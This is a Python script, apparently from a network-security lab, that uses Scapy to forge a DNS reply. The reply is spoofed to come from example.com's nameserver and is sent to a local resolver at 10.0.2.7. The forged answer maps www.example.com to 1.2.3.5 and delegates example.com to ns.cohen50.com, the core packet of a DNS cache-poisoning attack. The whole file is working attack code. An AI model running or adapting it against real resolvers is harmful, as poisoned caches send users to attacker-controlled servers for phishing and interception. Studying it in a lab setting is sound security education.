#!/usr/bin/python3

from scapy.all import *

name = "www.example.com"	# domain to query
domain = "example.com"		# response domain
ns = "ns.cohen50.com"		# nameserver that we need to spoof reply from

# This is the question section of the DNS request
Qdsec = DNSQR(qname=name)

# This is the answer section of the DNS request
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.5", ttl=259200)

# This is the nameserver section of the DNS request
NSsec  = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)


# Actual DNS record w/ question, answer, and NS sections inside
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
			qdcount=1, ancount=1, nscount=1, arcount=0,
			qd=Qdsec, an=Anssec, ns=NSsec)

# IP packet format from src to dst
ip = IP(dst="10.0.2.7", src="199.43.133.53", chksum=0)

# UDP request packet
udp = UDP(dport=33333, sport=53, chksum=0)

# Craft the request packet
# '/' is a composition operator between two layers
reply = ip/udp/dns

# send 1 request
#rep = send(reply, return_packets=True)
rep = send(reply)

print(rep)
